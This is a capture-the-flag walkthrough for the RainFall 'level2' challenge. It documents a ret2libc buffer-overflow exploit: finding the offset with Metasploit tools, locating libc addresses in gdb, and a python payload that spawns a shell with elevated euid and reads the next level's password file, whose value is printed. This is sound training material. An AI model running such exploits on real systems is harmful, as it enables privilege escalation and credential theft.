# Level 2

The binary is vulnerable to a ret2libc attack. The p function reads input from the user and stores it in the buffer variable. The gets function does not check the size of the input and can write more data than the buffer can hold, causing a buffer overflow. We can use this vulnerability to perform a ret2libc attack and spawn a shell.

Let's first find the offset, I will use metasploit's pattern_create and pattern_offset tools to find the offset.

```bash
┌──(kali㉿kali)-[~/rainfall]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100   
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

now we run gdb and pass the output of the pattern_create tool as input to the binary

```bash
level2@RainFall:~$ gdb -q ./level2 
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) info registers
eax            0x804a008        134520840
ecx            0x0      0
edx            0xbffff6cc       -1073744180
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff720       0xbffff720
ebp            0x63413563       0x63413563
esi            0x0      0
edi            0x0      0
eip            0x37634136       0x37634136
eflags         0x210286 [ PF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) 
```

The program crashes with a segmentation fault and we can see that the value of the eip register is 0x37634136. We can use this value to find the offset using the pattern_offset tool.

```bash
┌──(kali㉿kali)-[~/rainfall]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 100 -q '0x37634136'
[*] Exact match at offset 80
```

Now that we have the offset, we can find the address of the system function and the string "/bin/sh" in the libc library.

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb)  find &system,+9999999,"/bin/sh"
(gdb) find &system,+9999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```

Now we need the address of return instruction in the main function to overwrite the return address with the address of the system function. We can use the following command to find the address of the return instruction in the main function.

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   %ebp
   0x08048540 <+1>:     mov    %esp,%ebp
=> 0x08048542 <+3>:     and    $0xfffffff0,%esp
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave  
   0x0804854b <+12>:    ret    
End of assembler dump.

```

The address of the return instruction in the main function is 0x0804854b.

Now we can write the exploit script to spawn a shell.

```bash
level2@RainFall:~$ python2 -c 'print "A"*80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "BBBB" + "\x58\xcc\xf8\xb7"' > /tmp/exploit1
level2@RainFall:~$ cat /tmp/exploit1 - | ./level2 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKAAAAAAAAAAAAK`���BBBBX���
id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
cd /home/user/level3
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

